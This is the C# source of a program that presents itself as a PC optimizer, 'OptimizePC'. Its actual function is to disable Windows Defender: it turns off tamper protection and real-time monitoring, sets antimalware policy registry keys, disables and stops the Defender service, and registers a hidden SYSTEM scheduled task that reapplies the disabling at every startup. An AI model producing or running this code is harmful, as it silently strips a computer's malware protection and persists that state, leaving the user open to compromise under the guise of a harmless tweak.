using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;

class Program
{
    static StreamWriter log;
    static string InstallDir = @"C:\ProgramData\OptimizePC";

    static void Main()
    {
        try
        {
            log = new StreamWriter(Path.Combine(Path.GetTempPath(), "OptimizePC.log"), false);
        }
        catch { }

        Console.WriteLine("Applying tweaks...");

        RunPs("Set-MpPreference -DisableTamperProtection $true");
        Thread.Sleep(2000);

        SetPolicy(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1);
        SetPolicy(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiMalware", 1);
        SetPolicy(@"SOFTWARE\Policies\Microsoft\Windows\DataCollection", "AllowTelemetry", 1);

        SetServiceStart("DiagTrack", 4);
        SetServiceStart("WinDefend", 4);

        RunPs("Set-MpPreference -DisableRealtimeMonitoring $true");

        StopService("WinDefend");
        StopService("DiagTrack");

        InstallBootTask();

        Write("verify: WinDefend Start=" + ReadServiceStart("WinDefend")
            + ", DiagTrack Start=" + ReadServiceStart("DiagTrack"));
        if (log != null) { log.Flush(); log.Close(); }
        Console.WriteLine("Done. Log: OptimizePC.log in TEMP");
    }

    static void InstallBootTask()
    {
        try
        {
            Directory.CreateDirectory(InstallDir);
            string reapply = @"
Start-Sleep -Seconds 30
Set-MpPreference -DisableTamperProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
";
            string reapplyPath = Path.Combine(InstallDir, "reapply.ps1");
            File.WriteAllText(reapplyPath, reapply);

            string register = "Unregister-ScheduledTask -TaskName OptimizePC -Confirm:$false -ErrorAction SilentlyContinue; "
                + "$a = New-ScheduledTaskAction -Execute powershell.exe -Argument '-NoProfile -NonInteractive -WindowStyle Hidden -File "
                + reapplyPath + "'; "
                + "$t = New-ScheduledTaskTrigger -AtStartup; "
                + "$p = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; "
                + "Register-ScheduledTask -TaskName OptimizePC -Action $a -Trigger $t -Principal $p | Out-Null; "
                + "Start-ScheduledTask -TaskName OptimizePC";
            RunPs(register);
            Write("boot task registered (re-applies disable ~30s after every startup)");
        }
        catch (Exception e) { Write("FAIL boot task: " + e.Message); }
    }

    static void Write(string msg)
    {
        Console.WriteLine(msg);
        if (log != null) log.WriteLine(msg);
    }

    static int ReadServiceStart(string service)
    {
        try
        {
            object v = Registry.LocalMachine.OpenSubKey(
                @"SYSTEM\CurrentControlSet\Services\" + service).GetValue("Start");
            return Convert.ToInt32(v);
        }
        catch { return -1; }
    }

    static void SetPolicy(string path, string name, int value)
    {
        try
        {
            RegistryKey key = Registry.LocalMachine.CreateSubKey(path);
            key.SetValue(name, value, RegistryValueKind.DWord);
            key.Close();
            Write(name + " = " + value + " [" + path + "]");
        }
        catch (Exception e) { Write("FAIL " + name + ": " + e.Message); }
    }

    static void SetServiceStart(string service, int startType)
    {
        try
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(
                @"SYSTEM\CurrentControlSet\Services\" + service, true);
            if (key == null) { Write("service not found: " + service); return; }
            key.SetValue("Start", startType, RegistryValueKind.DWord);
            key.Close();
            Write(service + " Start = " + startType);
        }
        catch (Exception e) { Write("FAIL " + service + ": " + e.Message); }
    }

    static void StopService(string service)
    {
        RunPs("Stop-Service -Name '" + service + "' -Force");
    }

    static void RunPs(string command)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"" + command + "\"";
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            Process p = Process.Start(psi);
            string stdout = p.StandardOutput.ReadToEnd();
            string stderr = p.StandardError.ReadToEnd();
            p.WaitForExit(60000);
            Write("ps -> " + (stdout.Trim().Length > 0 ? stdout.Trim().Replace("\r\n", " | ") : "ok")
                + (stderr.Trim().Length > 0 ? " ERR: " + stderr.Trim() : ""));
        }
        catch (Exception e) { Write("FAIL ps: " + e.Message); }
    }
}
